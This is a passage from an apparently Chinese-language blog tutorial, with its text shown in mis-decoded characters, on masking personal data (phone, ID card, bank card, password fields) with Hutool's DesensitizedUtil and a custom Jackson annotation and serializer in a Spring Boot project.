ã€Emojiã€FTPã€åˆ†è¯ç­‰ï¼‰</td></tr><tr><td>hutool-http</td><td>åŸºäºHttpUrlConnectionçš„Httpå®¢æˆ·ç«¯å°è£…</td></tr><tr><td>hutool-log</td><td>è‡ªåŠ¨è¯†åˆ«æ—¥å¿—å®ç°çš„æ—¥å¿—é—¨é¢</td></tr><tr><td>hutool-script</td><td>è„šæœ¬æ‰§è¡Œå°è£…ï¼Œä¾‹å¦‚Javascript</td></tr><tr><td>hutool-setting</td><td>åŠŸèƒ½æ›´å¼ºå¤§çš„Settingé…ç½®æ–‡ä»¶å’ŒPropertieså°è£…</td></tr><tr><td>hutool-system</td><td>ç³»ç»Ÿå‚æ•°è°ƒç”¨å°è£…ï¼ˆJVMä¿¡æ¯ç­‰ï¼‰</td></tr><tr><td>hutool-json</td><td>JSONå®ç°</td></tr><tr><td>hutool-captcha</td><td>å›¾ç‰‡éªŒè¯ç å®ç°</td></tr><tr><td>hutool-poi</td><td>é’ˆå¯¹POIä¸­Excelå’ŒWordçš„å°è£…</td></tr><tr><td>hutool-socket</td><td>åŸºäºJavaçš„NIOå’ŒAIOçš„Socketå°è£…</td></tr><tr><td>hutool-jwt</td><td>JSON Web Token (JWT)å°è£…å®ç°</td></tr></tbody></table></div><p>å¯ä»¥æ ¹æ®éœ€æ±‚å¯¹æ¯ä¸ªæ¨¡å—å•ç‹¬å¼•å…¥ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å¼•å…¥<code>hutool-all</code>æ–¹å¼å¼•å…¥æ‰€æœ‰æ¨¡å—ï¼Œæœ¬æ–‡æ‰€ä½¿ç”¨çš„æ•°æ®è„±æ•å·¥å…·å°±æ˜¯åœ¨hutool.coreæ¨¡å—ã€‚</p><h3 id="2-3-Hutoolæ”¯æŒçš„è„±æ•æ•°æ®ç±»å‹"><a href="#2-3-Hutoolæ”¯æŒçš„è„±æ•æ•°æ®ç±»å‹" class="headerlink" title="2.3 Hutoolæ”¯æŒçš„è„±æ•æ•°æ®ç±»å‹"></a>2.3 Hutoolæ”¯æŒçš„è„±æ•æ•°æ®ç±»å‹</h3><p>ç°é˜¶æ®µæœ€æ–°ç‰ˆæœ¬çš„Hutoolæ”¯æŒçš„è„±æ•æ•°æ®ç±»å‹å¦‚ä¸‹ï¼ŒåŸºæœ¬è¦†ç›–äº†å¸¸è§çš„æ•æ„Ÿä¿¡æ¯ã€‚</p><ol><li>ç”¨æˆ·id</li><li>ä¸­æ–‡å§“å</li><li>èº«ä»½è¯å·</li><li>åº§æœºå·</li><li>æ‰‹æœºå·</li><li>åœ°å€</li><li>ç”µå­é‚®ä»¶</li><li>å¯†ç </li><li>ä¸­å›½å¤§é™†è½¦ç‰Œï¼ŒåŒ…å«æ™®é€šè½¦è¾†ã€æ–°èƒ½æºè½¦è¾†</li><li>é“¶è¡Œå¡</li></ol><h2 id="3-Hutoolæ•°æ®è„±æ•å®æ“"><a href="#3-Hutoolæ•°æ®è„±æ•å®æ“" class="headerlink" title="3. Hutoolæ•°æ®è„±æ•å®æ“"></a>3. Hutoolæ•°æ®è„±æ•å®æ“</h2><h3 id="3-1-ä½¿ç”¨Hutoolå·¥å…·ç±»ä¸€è¡Œä»£ç å®ç°è„±æ•"><a href="#3-1-ä½¿ç”¨Hutoolå·¥å…·ç±»ä¸€è¡Œä»£ç å®ç°è„±æ•" class="headerlink" title="3.1 ä½¿ç”¨Hutoolå·¥å…·ç±»ä¸€è¡Œä»£ç å®ç°è„±æ•"></a>3.1 ä½¿ç”¨Hutoolå·¥å…·ç±»ä¸€è¡Œä»£ç å®ç°è„±æ•</h3><p>Hutoolæä¾›çš„è„±æ•æ–¹æ³•å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s3.bitiful.net/pb01/193.webp" alt="avatar"></p><p>æ³¨æ„ï¼šHutool è„±æ•æ˜¯é€šè¿‡*æ¥ä»£æ›¿æ•æ„Ÿä¿¡æ¯çš„ï¼Œå…·ä½“å®ç°æ˜¯åœ¨StrUtil.hideæ–¹æ³•ä¸­ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦è‡ªå®šä¹‰éšè—ç¬¦å·ï¼Œåˆ™å¯ä»¥æŠŠHutoolçš„æºç æ‹·å‡ºæ¥ï¼Œé‡æ–°å®ç°å³å¯ã€‚</p><p>è¿™é‡Œä»¥æ‰‹æœºå·ã€é“¶è¡Œå¡å·ã€èº«ä»½è¯å·ã€å¯†ç ä¿¡æ¯çš„è„±æ•ä¸ºä¾‹ï¼Œä¸‹é¢æ˜¯å¯¹åº”çš„æµ‹è¯•ä»£ç ã€‚<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cn.hutool.core.util.DesensitizedUtil;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Hutoolå®ç°æ•°æ®è„±æ•</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HuToolDesensitizationTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testPhoneDesensitization</span><span class="params">()</span>&#123;</span><br><span class="line">        String phone=<span class="string">&quot;13723231234&quot;</span>;</span><br><span class="line">        System.out.println(DesensitizedUtil.mobilePhone(phone)); <span class="comment">//è¾“å‡ºï¼š137****1234</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testBankCardDesensitization</span><span class="params">()</span>&#123;</span><br><span class="line">        String bankCard=<span class="string">&quot;6217000130008255666&quot;</span>;</span><br><span class="line">        System.out.println(DesensitizedUtil.bankCard(bankCard)); <span class="comment">//è¾“å‡ºï¼š6217 **** **** *** 5666</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testIdCardNumDesensitization</span><span class="params">()</span>&#123;</span><br><span class="line">        String idCardNum=<span class="string">&quot;411021199901102321&quot;</span>;</span><br><span class="line">        <span class="comment">//åªæ˜¾ç¤ºå‰4ä½å’Œå2ä½</span></span><br><span class="line">        System.out.println(DesensitizedUtil.idCardNum(idCardNum,<span class="number">4</span>,<span class="number">2</span>)); <span class="comment">//è¾“å‡ºï¼š4110************21</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testPasswordDesensitization</span><span class="params">()</span>&#123;</span><br><span class="line">        String password=<span class="string">&quot;www.jd.com_35711&quot;</span>;</span><br><span class="line">        System.out.println(DesensitizedUtil.password(password)); <span class="comment">//è¾“å‡ºï¼š****************</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>ä»¥ä¸Šå°±æ˜¯ä½¿ç”¨Hutoolå°è£…å¥½çš„å·¥å…·ç±»å®ç°æ•°æ®è„±æ•ã€‚</p><h3 id="3-2-é…åˆJackSoné€šè¿‡æ³¨è§£æ–¹å¼å®ç°è„±æ•"><a href="#3-2-é…åˆJackSoné€šè¿‡æ³¨è§£æ–¹å¼å®ç°è„±æ•" class="headerlink" title="3.2 é…åˆJackSoné€šè¿‡æ³¨è§£æ–¹å¼å®ç°è„±æ•"></a>3.2 é…åˆJackSoné€šè¿‡æ³¨è§£æ–¹å¼å®ç°è„±æ•</h3><p>ç°åœ¨æœ‰äº†æ•°æ®è„±æ•å·¥å…·ç±»ï¼Œå¦‚æœå‰ç«¯éœ€è¦æ˜¾ç¤ºæ•°æ®æ•°æ®çš„åœ°æ–¹æ¯”è¾ƒå¤šï¼Œæˆ‘ä»¬ä¸å¯èƒ½åœ¨æ¯ä¸ªåœ°æ–¹éƒ½è°ƒç”¨ä¸€ä¸ªå·¥å…·ç±»ï¼Œè¿™æ ·å°±æ˜¾å¾—ä»£ç å¤ªå†—ä½™äº†ï¼Œé‚£æˆ‘ä»¬å¦‚ä½•é€šè¿‡æ³¨è§£çš„æ–¹å¼ä¼˜é›…çš„å®Œæˆæ•°æ®è„±æ•å‘¢ï¼Ÿ</p><p>å¦‚æœé¡¹ç›®æ˜¯åŸºäºspringbootçš„webé¡¹ç›®ï¼Œåˆ™å¯ä»¥åˆ©ç”¨springbootè‡ªå¸¦çš„jacksonè‡ªå®šä¹‰åºåˆ—åŒ–å®ç°ã€‚å®ƒçš„å®ç°åŸæ¥å…¶å®å°±æ˜¯åœ¨jsonè¿›è¡Œåºåˆ—åŒ–æ¸²æŸ“ç»™å‰ç«¯æ—¶ï¼Œè¿›è¡Œè„±æ•ã€‚</p><p><strong>ç¬¬ä¸€æ­¥ï¼šè„±æ•ç­–ç•¥çš„æšä¸¾ã€‚</strong><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>:è„±æ•ç­–ç•¥æšä¸¾</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">DesensitizationTypeEnum</span> &#123;</span><br><span class="line">    <span class="comment">//è‡ªå®šä¹‰</span></span><br><span class="line">    MY_RULE,</span><br><span class="line">    <span class="comment">//ç”¨æˆ·id</span></span><br><span class="line">    USER_ID,</span><br><span class="line">    <span class="comment">//ä¸­æ–‡å</span></span><br><span class="line">    CHINESE_NAME,</span><br><span class="line">    <span class="comment">//èº«ä»½è¯å·</span></span><br><span class="line">    ID_CARD,</span><br><span class="line">    <span class="comment">//åº§æœºå·</span></span><br><span class="line">    FIXED_PHONE,</span><br><span class="line">    <span class="comment">//æ‰‹æœºå·</span></span><br><span class="line">    MOBILE_PHONE,</span><br><span class="line">    <span class="comment">//åœ°å€</span></span><br><span class="line">    ADDRESS,</span><br><span class="line">    <span class="comment">//ç”µå­é‚®ä»¶</span></span><br><span class="line">    EMAIL,</span><br><span class="line">    <span class="comment">//å¯†ç </span></span><br><span class="line">    PASSWORD,</span><br><span class="line">    <span class="comment">//ä¸­å›½å¤§é™†è½¦ç‰Œï¼ŒåŒ…å«æ™®é€šè½¦è¾†ã€æ–°èƒ½æºè½¦è¾†</span></span><br><span class="line">    CAR_LICENSE,</span><br><span class="line">    <span class="comment">//é“¶è¡Œå¡</span></span><br><span class="line">    BANK_CARD</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä¸Šé¢è¡¨ç¤ºæ”¯æŒçš„è„±æ•ç±»å‹ã€‚</p><p><strong>ç¬¬äºŒæ­¥ï¼šå®šä¹‰ä¸€ä¸ªç”¨äºè„±æ•çš„ Desensitization æ³¨è§£ã€‚</strong></p><ul><li>@Retention(RetentionPolicy.RUNTIME)ï¼šè¿è¡Œæ—¶ç”Ÿæ•ˆã€‚</li><li>@Target(ElementType.FIELD)ï¼šå¯ç”¨åœ¨å­—æ®µä¸Šã€‚</li><li>@JacksonAnnotationsInsideï¼šæ­¤æ³¨è§£å¯ä»¥ç‚¹è¿›å»çœ‹ä¸€ä¸‹æ˜¯ä¸€ä¸ªå…ƒæ³¨è§£ï¼Œä¸»è¦æ˜¯ç”¨æˆ·æ‰“åŒ…å…¶ä»–æ³¨è§£ä¸€èµ·ä½¿ç”¨ã€‚</li><li>@JsonSerializeï¼šä¸Šé¢è¯´åˆ°è¿‡ï¼Œè¯¥æ³¨è§£çš„ä½œç”¨å°±æ˜¯å¯è‡ªå®šä¹‰åºåˆ—åŒ–ï¼Œå¯ä»¥ç”¨åœ¨æ³¨è§£ä¸Šï¼Œæ–¹æ³•ä¸Šï¼Œå­—æ®µä¸Šï¼Œç±»ä¸Šï¼Œè¿è¡Œæ—¶ç”Ÿæ•ˆç­‰ç­‰ï¼Œæ ¹æ®æä¾›çš„åºåˆ—åŒ–ç±»é‡Œé¢çš„é‡å†™æ–¹æ³•å®ç°è‡ªå®šä¹‰åºåˆ—åŒ–ã€‚<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Target(ElementType.FIELD)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@JacksonAnnotationsInside</span></span><br><span class="line"><span class="meta">@JsonSerialize(using = DesensitizationSerialize.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Desensitization &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è„±æ•æ•°æ®ç±»å‹ï¼Œåœ¨MY_RULEçš„æ—¶å€™ï¼ŒstartIncludeå’ŒendExcludeç”Ÿæ•ˆ</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    DesensitizationTypeEnum <span class="title function_">type</span><span class="params">()</span> <span class="keyword">default</span> DesensitizationTypeEnum.MY_RULE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è„±æ•å¼€å§‹ä½ç½®ï¼ˆåŒ…å«ï¼‰</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">startInclude</span><span class="params">()</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è„±æ•ç»“æŸä½ç½®ï¼ˆä¸åŒ…å«ï¼‰</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">endExclude</span><span class="params">()</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>æ³¨ï¼šåªæœ‰ä½¿ç”¨äº†è‡ªå®šä¹‰çš„è„±æ•æšä¸¾MY_RULEçš„æ—¶å€™ï¼Œå¼€å§‹ä½ç½®å’Œç»“æŸä½ç½®æ‰ç”Ÿæ•ˆã€‚</p><p><strong>ç¬¬ä¸‰æ­¥ï¼šåˆ›å»ºè‡ªå®šçš„åºåˆ—åŒ–ç±»</strong></p><p>è¿™ä¸€æ­¥æ˜¯æˆ‘ä»¬å®ç°æ•°æ®è„±æ•çš„å…³é”®ã€‚è‡ªå®šä¹‰åºåˆ—åŒ–ç±»ç»§æ‰¿ JsonSerializerï¼Œå®ç°ContextualSerializeræ¥å£ï¼Œå¹¶é‡å†™ä¸¤ä¸ªæ–¹æ³•ã€‚<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: è‡ªå®šä¹‰åºåˆ—åŒ–ç±»</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DesensitizationSerialize</span> <span class="keyword">extends</span> <span class="title class_">JsonSerializer</span>&lt;String&gt; <span class="keyword">implements</span> <span class="title class_">ContextualSerializer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> DesensitizationTypeEnum type;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer startInclude;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer endExclude;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(String str, JsonGenerator jsonGenerator, SerializerProvider serializerProvider)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">            <span class="comment">// è‡ªå®šä¹‰ç±»å‹è„±æ•</span></span><br><span class="line">            <span class="keyword">case</span> MY_RULE:</span><br><span class="line">                jsonGenerator.writeString(CharSequenceUtil.hide(str, startInclude, endExclude));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// userIdè„±æ•</span></span><br><span class="line">            <span class="keyword">case</span> USER_ID:</span><br><span class="line">                jsonGenerator.writeString(String.valueOf(DesensitizedUtil.userId()));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// ä¸­æ–‡å§“åè„±æ•</span></span><br><span class="line">            <span class="keyword">case</span> CHINESE_NAME:</span><br><span class="line">                jsonGenerator.writeString(DesensitizedUtil.chineseName(String.valueOf(str)));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// èº«ä»½è¯è„±æ•</span></span><br><span class="line">            <span class="keyword">case</span> ID_CARD:</span><br><span class="line">                jsonGenerator.writeString(DesensitizedUtil.idCardNum(String.valueOf(str), <span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// å›ºå®šç”µè¯è„±æ•</span></span><br><span class="line">            <span class="keyword">case</span> FIXED_PHONE:</span><br><span class="line">                jsonGenerator.writeString(DesensitizedUtil.fixedPhone(String.valueOf(str)));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// æ‰‹æœºå·è„±æ•</span></span><br><span class="line">            <span class="keyword">case</span> MOBILE_PHONE:</span><br><span class="line">                jsonGenerator.writeString(DesensitizedUtil.mobilePhone(String.valueOf(str)));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// åœ°å€è„±æ•</span></span><br><span class="line">            <span class="keyword">case</span> ADDRESS:</span><br><span class="line">                jsonGenerator.writeString(DesensitizedUtil.address(String.valueOf(str), <span class="number">8</span>));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// é‚®ç®±è„±æ•</span></span><br><span class="line">            <span class="keyword">case</span> EMAIL:</span><br><span class="line">                jsonGenerator.writeString(DesensitizedUtil.email(String.valueOf(str)));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// å¯†ç è„±æ•</span></span><br><span class="line">            <span class="keyword">case</span> PASSWORD:</span><br><span class="line">                jsonGenerator.writeString(DesensitizedUtil.password(String.valueOf(str)));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// ä¸­å›½è½¦ç‰Œè„±æ•</span></span><br><span class="line">            <span class="keyword">case</span> CAR_LICENSE:</span><br><span class="line">                jsonGenerator.writeString(DesensitizedUtil.carLicense(String.valueOf(str)));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// é“¶è¡Œå¡è„±æ•</span></span><br><span class="line">            <span class="keyword">case</span> BANK_CARD:</span><br><span class="line">                jsonGenerator.writeString(DesensitizedUtil.bankCard(String.valueOf(str)));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> JsonSerializer&lt;?&gt; createContextual(SerializerProvider serializerProvider, BeanProperty beanProperty) <span class="keyword">throws</span> JsonMappingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (beanProperty != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// åˆ¤æ–­æ•°æ®ç±»å‹æ˜¯å¦ä¸ºStringç±»å‹</span></span><br><span class="line">            <span class="keyword">if</span> (Objects.equals(beanProperty.getType().getRawClass(), String.class)) &#123;</span><br><span class="line">                <span class="comment">// è·å–å®šä¹‰çš„æ³¨è§£</span></span><br><span class="line">                <span class="type">Desensitization</span> <span class="variable">desensitization</span> <span class="operator">=</span> beanProperty.getAnnotation(Desensitization.class);</span><br><span class="line">                <span class="comment">// ä¸ºnull</span></span><br><span class="line">                <span class="keyword">if</span> (desensitization == <span class="literal">null</span>) &#123;</span><br><span class="line">                    desensitization = beanProperty.getContextAnnotation(Desensitization.class);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// ä¸ä¸ºnull</span></span><br><span class="line">                <span class="keyword">if</span> (desensitization != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// åˆ›å»ºå®šä¹‰çš„åºåˆ—åŒ–ç±»çš„å®ä¾‹å¹¶ä¸”è¿”å›ï¼Œå…¥å‚ä¸ºæ³¨è§£å®šä¹‰çš„type,å¼€å§‹ä½ç½®ï¼Œç»“æŸä½ç½®ã€‚</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DesensitizationSerialize</span>(desensitization.type(), desensitization.startInclude(),</span><br><span class="line">                            desensitization.endExclude());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> serializerProvider.findValueSerializer(beanProperty.getType(), beanProperty);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> serializerProvider.findNullValueSerializer(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ç»è¿‡ä¸Šè¿°ä¸‰æ­¥ï¼Œå·²ç»å®Œæˆäº†é€šè¿‡æ³¨è§£å®ç°æ•°æ®è„±æ•äº†ï¼Œä¸‹é¢æˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹ã€‚</p><p>é¦–å…ˆå®šä¹‰ä¸€ä¸ªè¦æµ‹è¯•çš„pojoï¼Œå¯¹åº”çš„å­—æ®µåŠ å…¥è¦è„±æ•çš„ç­–ç•¥ã€‚<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestPojo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Desensitization(type = DesensitizationTypeEnum.MOBILE_PHONE)</span></span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Desensitization(type = DesensitizationTypeEnum.PASSWORD)</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Desensitization(type = DesensitizationTypeEnum.MY_RULE, startInclude = 0, endExclude = 2)</span></span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æ¥ä¸‹æ¥å†™ä¸€ä¸ªæµ‹è¯•çš„controller<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> TestPojo <span class="title function_">testDesensitization</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">TestPojo</span> <span class="variable">testPojo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestPojo</span>();</span><br><span class="line">        testPojo.setUserName(<span class="string">&quot;æˆ‘æ˜¯ç”¨æˆ·å&quot;</span>);</span><br><span class="line">        testPojo.setAddress(<span class="string">&quot;åœ°çƒä¸­å›½-åŒ—äº¬å¸‚é€šå·åŒºäº¬ä¸œæ€»éƒ¨2å·æ¥¼&quot;</span>);</span><br><span class="line">        testPojo.setPhone(<span class="string">&quot;13782946666&quot;</span>);</span><br><span class="line">        testPojo.setPassword(<span class="string">&quot;sunyangwei123123123.&quot;</span>);</span><br><span class="line">        System.out.println(testPojo);</span><br><span class="line">        <span class="keyword">return</span> testPojo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://s3.bitiful.net/pb01/194.webp" 